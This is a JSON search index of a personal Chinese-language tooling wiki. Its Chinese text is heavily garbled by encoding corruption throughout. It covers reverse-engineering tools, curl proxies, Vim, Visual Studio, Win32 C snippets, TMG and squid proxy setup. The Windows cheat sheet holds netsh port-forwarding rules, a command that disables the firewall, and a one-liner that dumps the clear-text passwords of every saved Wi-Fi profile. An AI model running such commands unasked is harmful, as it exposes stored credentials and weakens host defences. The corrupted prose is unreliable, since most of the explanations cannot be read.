è£…å®ŒVC6æœ‰ä¸€å—è£…ï¼Œåœ¨å¼€å§‹èœå•é‚£å¯ä»¥æ‰¾åˆ°ã€‚æˆ–å®‰è£…ç›®å½•\\Microsoft Visual Studio\\Common\\Toolsæ–‡ä»¶å¤¹ä¸‹ æˆ–ç‹¬ç«‹ä¸‹è½½å®‰è£… Dependencies å¼€æºçš„ï¼Œå‡çº§ç‰ˆçš„Dependency Walkerï¼Œæ”¯æŒwin10 VSçš„dumpbin è¿›å…¥VSå¼€å‘ç¯å¢ƒï¼Œç„¶åTools -&gt; å¼€å‘è€…å‘½ä»¤æç¤º cdåˆ°dllæ‰€åœ¨ç›®å½•ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤çœ‹åˆ°a.dllçš„æ‰€æœ‰å¯¼å‡ºå‡½æ•° 1dumpbin /exports a.dll ç»å¯¹è·¯å¾„1dumpbin /exports â€œC:\\Windows\\System32\\user32.dllâ€ æˆ–åœ¨VSå®‰è£…ç›®å½•\\VC\\bin\\ä¸‹æ‰¾åˆ°dumpbin.exe"},{"title":"Software Analysis","path":"/wiki/essentials_os_tools/Software_Analysis.html","content":"è°ƒè¯•å™¨ Ollydbg åæ±‡ç¼–çª—å£åŒº F2ï¼Œæ™®é€šæ–­ç‚¹ F4ï¼Œç›¸å½“äºF2ï¼ŒF9ï¼ŒF2 F7ï¼Œå•æ­¥æ­¥å…¥ F8ï¼Œå•æ­¥æ­¥è¿‡ F9ï¼Œæ‰§è¡Œç¨‹åº è°ƒçª—å£ç¨‹åºï¼š æ¶ˆæ¯æ–­ç‚¹æ¡ä»¶1[esp+8]==WM_LBUTTONDOWN å­çª—å£æ–­ç‚¹ å­çª—å£æ–­ç‚¹1[esp+8]==WM_COMMAND å­çª—å£æ–­ç‚¹+å…·ä½“çš„å­çª—å£ID1[esp+8]==WM_COMMAND&amp;&amp;[esp+0xC]==0x3EB åˆšè¿›å…¥å›è°ƒå‡½æ•°æ—¶çš„å †æ ˆå¸ƒå±€ï¼š ESP è¿”å›åœ°å€ hwnd uMsg wParam lParam ;ï¼Œæ³¨é‡Š é€‰ä¸­ä¸€æ®µåæ±‡ç¼–/æ•°æ®ï¼ŒCtrl+Aé‡æ–°åˆ†æï¼ˆç›¸å½“äºå³é”®èœå•åˆ†æ-é‡æ–°åˆ†æï¼‰ å †æ ˆåŒº å³é”®ï¼Œé”å®š/è§£é”å †æ ˆ é™æ€åˆ†æ IDA Aã€Cã€Dã€U Gï¼šè·³è½¬æŒ‡ä»¤ Alt+Tï¼šæœç´¢æŒ‡ä»¤ æ³¨é‡Š ; ï¼š äº¤å‰å¼•ç”¨x å¾…æ•´ç†"},{"title":"Tools","path":"/wiki/essentials_os_tools/Tools.html","content":"httpæœåŠ¡ python2èµ·httpæœåŠ¡ï¼Œé»˜è®¤ä½¿ç”¨ç«¯å£8000 1python -m SimpleHTTPServer [port] python3èµ·httpæœåŠ¡ï¼Œé»˜è®¤ä½¿ç”¨ç«¯å£8000 1python -m http.server [port] curl ä»£ç†åŠŸèƒ½ å‚è€ƒï¼šhttps://aiezu.com/article/linux_curl_proxy_http_socks.html å‚æ•° ç”¨æ³• -x host:port -x [protocol://[user:pwd@]host[:port] --proxy [protocol://[user:pwd@]host[:port] ä½¿ç”¨HTTPä»£ç†è®¿é—®ï¼›å¦‚æœæœªæŒ‡å®šç«¯å£ï¼Œé»˜è®¤ä½¿ç”¨8080ç«¯å£; protocolé»˜è®¤ä¸ºhttp_proxyï¼Œå…¶ä»–å¯èƒ½çš„å€¼åŒ…æ‹¬ï¼š http_proxyã€HTTPS_PROXYã€socks4ã€socks4aã€socks5ï¼› å¦‚ï¼š --proxy 8.8.8.8:8080ï¼› -x â€œhttp_proxy://aiezu:123@aiezu.com:80â€ æ¯”å¦‚ï¼šå¸¦è®¤è¯çš„socks5ä»£ç† 1curl -x socks5://admin:admin@192.168.199.146:7777 http://192.168.199.151:8089/ ä¸å¸¦è®¤è¯çš„socks5ä»£ç† 1curl -x socks5://192.168.199.146:7777 http://192.168.199.151:8089/ ä½¿ç”¨curlä¸‹è½½ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ç»ˆç«¯å›æ˜¾ï¼š 1234SF01V_VM01_SFOS 19.5.1 MR-1-Build278# curl 192.168.242.129:8080/textWarning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tellWarning: curl to output it to your terminal anyway, or consider &quot;--outputWarning: &lt;FILE&gt;&quot; to save to a file. åŸå› ï¼š textæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œcurlå®ƒä¼šè¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™ä¼šmess up your terminalã€‚ å¦‚æœç¡®å®šè¦ç»§ç»­è¾“å‡ºï¼Œç”¨--output -è¾“è¿™æ¡å‘½ä»¤ï¼š 1curl --output - 192.168.242.129:8080/text å¦‚æœæ˜¯æƒ³ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œç”¨--output &lt;FILE&gt;ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œç¼©å†™æ˜¯-oï¼Œå¦‚ä¸‹é¢è¿™æ¡å‘½ä»¤ï¼š 1curl 192.168.242.129:8080/text -o text"},{"title":"Vim","path":"/wiki/essentials_os_tools/Vim.html","content":"å‘½ä»¤æ¨¡å¼ï¼ˆCommand Modeï¼‰ åˆšå¯åŠ¨vi/vimï¼Œè¿›å…¥çš„å°±æ˜¯å‘½ä»¤æ¨¡å¼ i â€“ åœ¨å½“å‰å…‰æ ‡ä½ç½®å¼€å§‹è¾“å…¥æ–‡æœ¬ï¼Œè¿›å…¥åˆ°è¾“å…¥æ¨¡å¼ o â€“ åœ¨å½“å‰è¡Œçš„ä¸‹æ–¹æ’å…¥ä¸€ä¸ªæ–°è¡Œï¼Œè¿›å…¥åˆ°è¾“å…¥æ¨¡å¼ å…‰æ ‡ç§»åŠ¨ï¼š G â€“ ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡ä»¶çš„æœ€åä¸€è¡Œ $ æˆ–åŠŸèƒ½é”®[End] â€“ ç§»åŠ¨åˆ°è¿™ä¸€è¡Œçš„æœ€åé¢å­—ç¬¦å¤„ åˆ é™¤ï¼š dd â€“ å‰ªåˆ‡æ¸¸æ ‡æ‰€åœ¨çš„é‚£ä¸€æ•´è¡Œ(å¸¸ç”¨)ï¼Œç”¨ p/P å¯ä»¥ç²˜è´´ï¼ˆå¯ä»¥æ‹¿æ¥å½“åˆ é™¤ç”¨ï¼‰ æ’¤é”€è¿˜åŸï¼š u â€“ å¤åŸå‰ä¸€ä¸ªåŠ¨ä½œ [Ctrl]+r â€“ é‡åšä¸Šä¸€ä¸ªåŠ¨ä½œ é€€å‡ºï¼š :w â€“ ä¿å­˜æ–‡ä»¶ :q â€“ é€€å‡º Vim ç¼–è¾‘å™¨ :q! â€“ å¼ºåˆ¶é€€å‡ºVim ç¼–è¾‘å™¨ï¼Œä¸ä¿å­˜ä¿®æ”¹ã€‚ å¯ç»„åˆæˆ :wq â€“ ä¿å­˜æ–‡ä»¶å¹¶é€€å‡º Vim ç¼–è¾‘å™¨ å‚è€ƒé“¾æ¥ğŸ”— Linux vi/vim-èœé¸Ÿæ•™ç¨‹"},{"title":"Visual Studio","path":"/wiki/essentials_os_tools/Visual_Studio.html","content":"é€šç”¨çŸ¥è¯† è§£å†³æ–¹æ¡ˆä¸é¡¹ç›®çš„åŒºåˆ« ä¸€ä¸ªè§£å†³æ–¹æ¡ˆä¸­å¤šä¸ªé¡¹ç›®+åˆ†åˆ«å¦‚ä½•ç¼–è¯‘ visual studioåœ¨ä¸€ä¸ªè§£å†³æ–¹æ¡ˆ(solution)ä¸­æ˜¯å¯ä»¥æ·»åŠ å¤šä¸ªé¡¹ç›®(projectï¼‰çš„ï¼Œè¿™å¤šä¸ªé¡¹ç›®ä¹‹é—´å­˜åœ¨ä¸¤ç§å…³ç³»ï¼š é¡¹ç›®é—´å½¼æ­¤ç‹¬ç«‹ï¼Œå„è‡ªæœ‰å„è‡ªçš„å…¥å£ï¼Œåªæ˜¯ç»„ç»‡åœ¨ä¸€ä¸ªè§£å†³æ–¹æ¡ˆä¸­ä¾¿äºç®¡ç† é¡¹ç›®é—´å­˜åœ¨ç›¸äº’è°ƒç”¨ï¼Œåªå­˜åœ¨ä¸€ä¸ªå…¥å£ã€‚è¿™å¯¹äºå¤šç§è¯­è¨€æ··ç¼–çš„ç®¡ç†ç‰¹åˆ«æ–¹ä¾¿ã€‚ å¯¹è§£å†³æ–¹æ¡ˆé‡å‘½åï¼š Visual studio è§£å†³æ–¹æ¡ˆå’Œé¡¹ç›®åç§°åˆ›å»ºä¸ä¿®æ”¹ å¿«æ·é”® Ctrl+Kï¼ŒCtrl+Cï¼Œæ³¨é‡Š Ctrl+Kï¼ŒCtrl+Uï¼Œå–æ¶ˆæ³¨é‡Š è°ƒè¯•ï¼š F10æ­¥è¿‡ F11ï¼Œæ­¥å…¥ é…ç½® å»é™¤pdbä¿¡æ¯ï¼šhttps://blog.csdn.net/typ2004/article/details/22826657 å…³é—­ASLRï¼šhttps://blog.csdn.net/HappyBear1995/article/details/51126998 é™æ€ç¼–è¯‘ï¼šhttps://blog.csdn.net/u012308586/article/details/94733155 C/C+Â±&gt;ä»£ç ç”Ÿæˆ-&gt;è¿è¡Œåº“ï¼Œå¸¦dçš„æ˜¯debug æ’ä»¶ Folder To Solution Folderï¼šæ·»åŠ ç‰©ç†ç›®å½•ä¸ºè§£å†³æ–¹æ¡ˆç›®å½• çœ‹è¿™ç¯‡æ–‡ç« å‘ç°çš„ï¼šhttps://www.cnblogs.com/Kit-L/p/13888534.html"},{"title":"Windows","path":"/wiki/essentials_os_tools/Windows.html","content":"cheat sheet è®¡ç®—æ–‡ä»¶MD5å€¼ 1certutil -hashfile demo.txt MD5 å¿˜è®°ç”¨æˆ·å¯†ç ï¼Œç”¨runaséªŒè¯ 1runas /user:test whoami ä¼šè®©è¾“å…¥testç”¨æˆ·çš„å¯†ç ï¼Œæ­£ç¡®å°±å›æ˜¾ netshç«¯å£è½¬å‘ å‚è€ƒé“¾æ¥ğŸ”—ï¼šwindowså‘½ä»¤è¡Œä¸‹ç”¨netshå®ç°ç«¯å£è½¬å‘(ç«¯å£æ˜ å°„) ç®¡ç†å‘˜cmdï¼ŒæŸ¥çœ‹å·²å­˜åœ¨çš„è½¬å‘1netsh interface portproxy show all åˆ—å‡ºæ‰€æœ‰æ¥å£ä»¥ç¡®è®¤æ¥å£åç§°1netsh interface ipv4 show interfaces å¯ç”¨æŸä¸ªç½‘å¡çš„IPè·¯ç”±è½¬å‘ å‡è®¾æŸä¸ªç½‘å¡åç§°æ˜¯â€œWLANâ€1netsh interface ipv4 set interface &quot;WLAN&quot; forwarding=enabled éœ€è¦å°†192.168.204.150çš„3389ç«¯å£è½¬å‘åˆ°3340ç«¯å£ï¼Œåˆ™éœ€è¦åœ¨192.168.204.150ä¸»æœºçš„å‘½ä»¤è¡Œè¾“å…¥è¯¥è¯­å¥ 1netsh interface portproxy add v4tov4 listenport=3340 listenaddress=192.168.204.150 connectport=3389 connectaddress=192.168.204.150 å¦‚æœè¦å°†ä¼ å…¥çš„TCPè¿æ¥è½¬å‘è‡³å¦ä¸€å°è®¡ç®—æœºï¼š 1netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.100.101 åˆ é™¤æŒ‡å®šè§„åˆ™ 1netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=192.168.204.150 ä½¿ç”¨netstatç¡®ä¿3340ç«¯å£å½“å‰å¤„äºè¢«ä¾¦å¬çŠ¶æ€ï¼š 1netstat -ano | findstr :3340 æ¸…é™¤æ‰€æœ‰å½“å‰çš„ç«¯å£è½¬å‘è§„åˆ™ 1netsh interface portproxy reset å…³é—­é˜²ç«å¢™ ç¦ç”¨ç³»ç»Ÿé˜²ç«å¢™1netsh firewall set opmode disable å¯ç”¨é˜²ç«å¢™ 1netsh firewall set opmode enable æ‰¹å¤„ç†è¯­å¥ å¤šæ¬¡æ‰§è¡Œç¨‹åº cmdç‰ˆ1for /l %i in (1,1,50) do start &quot;&quot; &quot;test.exe&quot; batç‰ˆæœ¬ï¼Œå¤šä¸€ä¸ª%1for /l %%i in (1,1,50) do start &quot;&quot; &quot;GiftBoxHTTPLoaderGenerate.exe&quot; å¤šæ¬¡å¤åˆ¶ä¸€ä¸ªç¨‹åº 1for /l %i in (1,1,2) do copy xxx.exe xxx%i.exe åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºå¤šä¸ªæœ‰è§„å¾‹çš„æ–‡ä»¶å¤¹ è®°äº‹æœ¬è®°å¾—å¦å­˜ä¸ºANSIï¼Œå¦åˆ™åˆ›å»ºå‡ºçš„æ–‡ä»¶å¤¹ä¼šä¹±ç 123456@echo offfor /L %%i in (1,1,11) do ( mkdir ç¬¬%%iä¸ªæ–‡ä»¶å¤¹)echo æ–‡ä»¶å¤¹åˆ›å»ºå®Œæˆã€‚pause è·å–wifiå¯†ç  æ˜¾ç¤ºç”µè„‘è¿æ¥è¿‡çš„æ‰€æœ‰WIFIè®°å½•é…ç½®ä¿¡æ¯ æ™®é€šcmd1netsh wlan show profile è¾“å‡ºè¦æŸ¥çœ‹çš„wifiçš„å¯¹åº”å¯†ç 1netsh wlan show profiles name=&quot;WiFiåç§°&quot; key=clear æ˜¾ç¤ºç”µè„‘æ‰€æœ‰æ›¾ç»è¿æ¥è¿‡çš„Wi-Fiå¯†ç 1for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 123 123 123 å‡ºé”™è§£å†³ win server2008/win server2012è¿è¡Œç¨‹åºæŠ¥ä¸¢å¤±Wlanapi.dll è§£å†³åŠæ³•ï¼šæ·»åŠ åŠŸèƒ½-å®‰è£…æ— çº¿LANæœåŠ¡ï¼ˆWireless LAN Serviceï¼‰ï¼Œå®‰è£…åå¯èƒ½éœ€è¦é‡å¯ å‚è€ƒé“¾æ¥ğŸ”—ï¼š è§£å†³windows server 2008 r2 å®‰è£…é’‰é’‰å®¢æˆ·ç«¯ç¼ºå°‘wlanapi.dllæ–‡ä»¶çš„æç¤º Windows2008R2ç³»ç»Ÿä¸‹ä¸¢å¤±wlanapi.dllé—®é¢˜çš„è§£å†³ çŸ¥è¯†ç±» å¾®è½¯æ“ä½œç³»ç»Ÿåˆ—è¡¨-Wikiç™¾ç§‘ï¼ˆä¸‹æ‹‰åˆ°æœ€åçš„è¡¨æ ¼ï¼‰ å…³é—­defenderï¼šhttps://zhuanlan.zhihu.com/p/39959842"},{"title":"Windows via C/C++","path":"/wiki/essentials_os_tools/Windows_via_CC++.html","content":"wait functionsç­‰å¾…å‡½æ•° WaitForSingleObject123HANDLE hThread1 = CreateThread(NULL, NULL, ThreadProc, NULL, 0, NULL);WaitForSingleObject(hThread, INFINITE); WaitForMultipleObjects123456789101112131415// åˆ›å»ºå¤šä¸ªçº¿ç¨‹HANDLE threads[4];for (int i = 0; i &lt; 4; i++)&#123; threads[i] = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);&#125;// ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸWaitForMultipleObjects(4, threads, TRUE, INFINITE);// å…³é—­çº¿ç¨‹å¥æŸ„for (i = 0; i &lt; 4; i++)&#123; CloseHandle(threads[i]);&#125; çº¿ç¨‹äº’æ–¥ 123456789101112131415CRITICAL_SECTION g_cs;void main()&#123; //åˆå§‹åŒ–ä¸´ç•ŒåŒºèµ„æº InitializeCriticalSection(&amp;g_cs); //è¿›å…¥ä¸´ç•ŒåŒº EnterCriticalSection(&amp;g_cs); /***ä¸´ç•ŒåŒº***/ //ç¦»å¼€ä¸´ç•ŒåŒº LeaveCriticalSection(&amp;g_cs); //åˆ é™¤ä¸´ç•ŒåŒºèµ„æº DeleteCriticalSection(&amp;g_cs); &#125; 123456789101112// åˆ›å»ºäº’æ–¥ä½“HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;XYZ&quot;);// HANDLE hMutex = CreateMutex(NULL, FALSE, NULL); //æ— åäº’æ–¥ä½“// è·å–ä»¤ç‰ŒWaitForSingleObject(hMutex, INFINITE);/***ä¸´ç•ŒåŒº***/// é‡Šæ”¾ä»¤ç‰ŒReleaseMutex(hMutex);// å…³é—­å¥æŸ„CloseHandle(hMutex); å¯¹è¯æ¡† å¯¹è¯æ¡†æ¨¡æ¿123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;Windows.h&gt;#include &quot;resource.h&quot;\t#include &lt;commctrl.h&gt;#pragma comment(lib,&quot;comctl32.lib&quot;)BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—)&#123; DialogBox(hInstance, //å½“å‰ç¨‹åºçš„å®ä¾‹å¥æŸ„ MAKEINTRESOURCE(IDD_DIALOG_MAIN), //å¯¹è¯æ¡†æ¨¡æ¿çš„åç§°æˆ–èµ„æºæ ‡è¯†ç¬¦ NULL, //çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ— ï¼Œä¸ºNULL DialogProc //å¯¹è¯æ¡†æ¶ˆæ¯å¤„ç†å‡½æ•° ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //å¯¹è¯æ¡†åˆå§‹åŒ–çš„æ¶ˆæ¯ &#123; return TRUE; &#125;\tcase WM_NOTIFY: //æ§ä»¶æ¶ˆæ¯ç±»å‹\t&#123; // auto pNMHDR = (NMHDR*)lParam; // if (wParam == IDC_LIST_PROCESS &amp;&amp; pNMHDR-&gt;code == NM_CLICK) //Process Listæ§ä»¶ ç‚¹å‡»é¼ æ ‡å·¦é”® // &#123; // //MessageBox(0, 0, 0, 0); //æµ‹ä¸€ä¸‹ // EnumModules(GetDlgItem(hwndDlg, IDC_LIST_PROCESS), wParam, lParam); //å‡½æ•°ï¼šæšä¸¾è¿›ç¨‹ä¸­æ¨¡å—å¹¶æ˜¾ç¤ºåœ¨æ¨¡å—åˆ—è¡¨ä¸­ // &#125; return TRUE;\t&#125; case WM_COMMAND: //å­çª—å£æ¶ˆæ¯ switch (LOWORD(wParam)) &#123; case IDC_BUTTON_EXIT: //IDC_BUTTON_EXITæŒ‰é’® EndDialog(hwndDlg, 0); //å…³é—­å¯¹è¯æ¡† return TRUE; case IDC_BUTTON_START: //IDC_BUTTON_STARTæŒ‰é’® HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL);// åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ä½œä¸ºå·¥ä½œçº¿ç¨‹ï¼Œé˜²æ­¢UIå¡é¡¿ CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;//å·¥ä½œçº¿ç¨‹DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; return 0;&#125; å­æ§ä»¶ è®¾ç½®ç¼–è¾‘æ¡†ä¸­çš„å€¼ 123TCHAR szEditBuffer[0x80];GetDlgItemText(hwnd, (int)IDC_EDIT_1, szEditBuffer, 0x80); //è·å–ç¼–è¾‘æ¡†ä¸­å†…å®¹SetWindowText(hEdit, TEXT(&quot;1000&quot;)); //è®¾ç½®ç¼–è¾‘æ¡†åˆå§‹æ˜¾ç¤ºçš„å€¼ä¸º1000 è·å–ç¼–è¾‘æ¡†ä¸­çš„å€¼ 12345//1ã€è·å–æ–‡æœ¬æ¡†å¥æŸ„hEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME);//2ã€é€šè¿‡å¥æŸ„å¾—åˆ°é‡Œé¢çš„å†…å®¹TCHAR szUserBuff[0x50];GetWindowText(hEditUser, szUserBuff, 0x50); ç¼–è¾‘æ¡† ä»ç¼–è¾‘æ¡†å–å€¼å†æ”¾å› æ–¹å¼ä¸€12345678char buf[10] = &#123; 0 &#125;;int count;GetWindowText(hEdit, buf, 10); // ä»ç¼–è¾‘æ¡†è¯»å€¼count = atoi(buf); // å­—ç¬¦è½¬æ•°å­—//...å¯¹æ•°å€¼countè¿›è¡Œå¤„ç†sprintf(buf, &quot;%d&quot;, --count); // æ•°å­—è½¬å­—ç¬¦SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ æ–¹å¼äºŒ123456789101112131415161718192021222324GetDlgItem(hDlg, IDC_EDIT_TIMER); //è·å–å­çª—å£å¥æŸ„GetWindowText(å¥æŸ„, æ•°æ®ç¼“å†²åŒº, é•¿åº¦); //ä»ç¼–è¾‘æ¡†è·å–æ–‡æœ¬sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); //å­—ç¬¦ä¸²è½¬æ•°å­—sprintf(æ•°æ®ç¼“å†²åŒº, &quot;%d&quot;, æ•°å­—); //æ•°å­—è½¬å­—ç¬¦ä¸²SetWindowText(å¥æŸ„, æ•°æ®ç¼“å­˜åŒº); //è®¾ç½®ç¼–è¾‘æ¡†æ–‡æœ¬----ä¾‹GetDlgItem(hDlg, IDC_EDIT_TIMER); //è·å–å­çª—å£å¥æŸ„TCHAR szBuffer[256]; // å‡è®¾è¶³å¤Ÿå¤§ä»¥å­˜å‚¨ç¼–è¾‘æ¡†å†…å®¹GetWindowText(hEdit, szBuffer, sizeof(szBuffer)); // ä»ç¼–è¾‘æ¡†è·å–æ–‡æœ¬int dwTimer;sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); // å°†è·å–çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°sprintf(szBuffer, &quot;%d&quot;, dwTimer); // å°†æ•´æ•°æ ¼å¼åŒ–å›å­—ç¬¦ä¸²SetWindowText(hEdit, szBuffer); // æ›´æ–°ç¼–è¾‘æ¡†æ–‡æœ¬"},{"title":"TMGä»£ç†æœåŠ¡å™¨","path":"/wiki/proxy_server_building/TMGä»£ç†æœåŠ¡å™¨.html","content":"ISAå‡çº§ç‰ˆï¼Œä½†å¤ªè€äº†ã€‚ç°åœ¨åŸºæœ¬æ²¡äººç”¨äº† è™šæ‹Ÿæœºæ¸…å• è™šæ‹Ÿæœº ç”¨é€” ç½‘å¡æ•°é‡åŠç”¨é€” æ ·ä¾‹ winserver2008 TMGä»£ç† 1å¼ æ¡¥æ¥/NATæ¨¡å¼ï¼ˆè¡¨ç¤ºèƒ½ä¸Šç½‘çš„å¡ï¼‰ï¼Œ1å¼ host-onlyæ¨¡å¼ï¼ˆè¡¨ç¤ºå†…ç½‘ç½‘å¡ï¼‰ LANï¼š192.168.242.220\tWANï¼š192.168.147.133 å†…ç½‘ä¸»æœº å†…ç½‘ä¸»æœº 1å¼ ç½‘å¡ï¼Œhost-onlyæ¨¡å¼ï¼Œè¡¨ç¤ºå†…ç½‘ç½‘å¡ 192.168.242.221 TMGä»£ç†æœåŠ¡å™¨å®‰è£… VMé…ç½® TMGå®‰è£… forefront_threat_management_gateway.isoè§£å‹åæ‹–å…¥winserver2008ä¸­ åŒå‡»autorun.exeè¿è¡Œï¼Œ è¿è¡Œå‡†å¤‡å·¥å…·ï¼Œå‡é»˜è®¤ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ å¼¹å‡ºForefront TMGä¼ä¸šå®‰è£…å‘å¯¼ï¼Œæ·»åŠ é€‚é…å™¨ï¼Œæ·»åŠ lanç½‘å¡ å…¶ä½™é»˜è®¤ï¼Œä¸‹ä¸€æ­¥ï¼Œè‡³æ­¤ï¼Œå®‰è£…å®Œæˆ å‚è€ƒç½‘å€ï¼šhttps://blog.51cto.com/loveunicom/395977 https://blog.51cto.com/hznethome/1543825 https://blog.51cto.com/hznethome/1544809 ç½‘ç»œé…ç½® å‚è€ƒç½‘å€ï¼šhttps://blog.51cto.com/hznethome/1545304 https://blog.51cto.com/nickzp/1322442ï¼ˆè¯¥ç½‘å€é€‰çœ‹ï¼‰ ç‚¹å‡»â€˜é…ç½®ç½‘ç»œè®¾ç½®â€™ è¾¹ç¼˜é˜²ç«å¢™ ç‚¹å‡»â€˜é…ç½®ç³»ç»Ÿè®¾ç½®â€™ æ­ä¸€ä¸ªç®€å•çš„ï¼Œä¸åœ¨åŸŸä¸­ï¼Œå°±é»˜è®¤å·¥ä½œç»„ ç‚¹å‡»â€˜å®šä¹‰éƒ¨ç½²é€‰é¡¹â€™ é…ç½®å®Œæˆ webè®¿é—®ç­–ç•¥å‘å¯¼ é»˜è®¤ å®ä½“æœºæœ€å¥½å¯ç”¨ï¼Œè™šæ‹Ÿæœºä¸å¯ç”¨ æ–°å»ºè§„åˆ™å†…ç½‘äº’è®¿ æ–°å¢è§„åˆ™ï¼Œå†…ç½‘äº’è®¿ï¼š å› ä¸ºTMGæœåŠ¡å™¨æ²¡åœ¨åŸŸä¸­ï¼Œé€‰æ‰€æœ‰ç”¨æˆ· æ–°å»ºè§„åˆ™åï¼Œè®°å¾—ç‚¹å‡»â€œåº”ç”¨â€ é…ç½®åå†…ç½‘ä¸»æœºå¯ä»¥äº’è®¿ï¼Œé…ç½®å‰æ˜¯pingä¸é€šçš„ æ–°å»ºè§„åˆ™WEBä»£ç† æ–°å»ºè§„åˆ™ï¼Œé…ç½®WEBä»£ç†ï¼Œè®©å®¢æˆ·ç«¯æ­£å¸¸è®¿é—®å¤–ç½‘ï¼š è®°å¾—ç‚¹åº”ç”¨ å†…ç½‘ä¸»æœºä½¿ç”¨ä»£ç†ä¸Šç½‘ å†…ç½‘ä¸»æœºé…ç½®ä¸ºTMGä»£ç†æœåŠ¡å™¨ï¼Œç„¶åå°±å¯ä»¥ä¸Šç½‘å•¦ï¼"},{"title":"squidå†…ç½‘è®¤è¯ä»£ç†æœåŠ¡å™¨","path":"/wiki/proxy_server_building/squidè®¤è¯ä»£ç†æœåŠ¡å™¨æ­å»º.html","content":"å‚è€ƒ æ­å»ºéœ€è¦èº«ä»½è®¤è¯çš„ Squid ä»£ç† Linuxæ­å»ºsquidæœåŠ¡å®ç°å†…ç½‘æœºå™¨ä»£ç†ä¸Šç½‘ æ‹“å±•é˜…è¯» ä¸‡å­—é•¿æ–‡å¸¦ä½ äº†è§£æœ€å¸¸ç”¨çš„å¼€æº Squid ä»£ç†æœåŠ¡å™¨ï½œ2021 å¹´ä¸­æ€»ç»“ é’ˆå¯¹å¤–ç½‘çš„ä»£ç†é…ç½® squidå®‰è£…ä¸åŸºç¡€å‘½ä»¤ ç¯å¢ƒï¼šcentos 1234[root@localhost squid]# cat /etc/redhat-releaseCentOS Linux release 7.9.2009 (Core)[root@localhost user]# uname -aLinux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux å®‰è£… 1yum install -y squid æŸ¥çœ‹æ˜¯å¦å®‰è£…ï¼Œå°†åœ¨å·²å®‰è£…è½¯ä»¶åŒ…ä¸­æŸ¥æ‰¾åŒ…å«&quot;squid&quot;çš„è½¯ä»¶åŒ…ï¼Œå¹¶å°†å…¶åˆ—å‡º 1rpm -qa | grep squid é…ç½®æ–‡ä»¶ squidé…ç½®æ–‡ä»¶ä½äº/etc/squid/squid.confï¼Œå¦å¤–ï¼Œè¯¥ç›®å½•ä¸‹æœ‰/etc/squid/squid.conf.defaultæ–‡ä»¶ï¼Œæ˜¯é»˜è®¤é…ç½®ï¼Œä¿®æ”¹squid.confåæƒ³è¿˜åŸå°±ç”¨defaultæ–‡ä»¶è¦†ç›–å›å»ã€‚ ä»¥ä¸‹æ˜¯squid.confæ–‡ä»¶çš„å†…å®¹å’Œå„sectionsè§£è¯» 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273## Recommended minimum configuration:## Example rule allowing access from your local networks.# Adapt to list your (internal) IP networks from where browsing# should be allowedacl localnet src 10.0.0.0/8\t# RFC1918 possible internal networkacl localnet src 172.16.0.0/12\t# RFC1918 possible internal networkacl localnet src 192.168.0.0/16\t# RFC1918 possible internal networkacl localnet src fc00::/7 # RFC 4193 local private network rangeacl localnet src fe80::/10 # RFC 4291 link-local (directly plugged) machinesacl SSL_ports port 443acl Safe_ports port 80 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl Safe_ports port 70 # gopheracl Safe_ports port 210 # waisacl Safe_ports port 1025-65535\t# unregistered portsacl Safe_ports port 280 # http-mgmtacl Safe_ports port 488 # gss-httpacl Safe_ports port 591 # filemakeracl Safe_ports port 777 # multiling httpacl CONNECT method CONNECT## Recommended minimum Access Permission configuration:## Deny requests to certain unsafe portshttp_access deny !Safe_ports# Deny CONNECT to other than secure SSL portshttp_access deny CONNECT !SSL_ports# Only allow cachemgr access from localhosthttp_access allow localhost managerhttp_access deny manager# We strongly recommend the following be uncommented to protect innocent# web applications running on the proxy server who think the only# one who can access services on 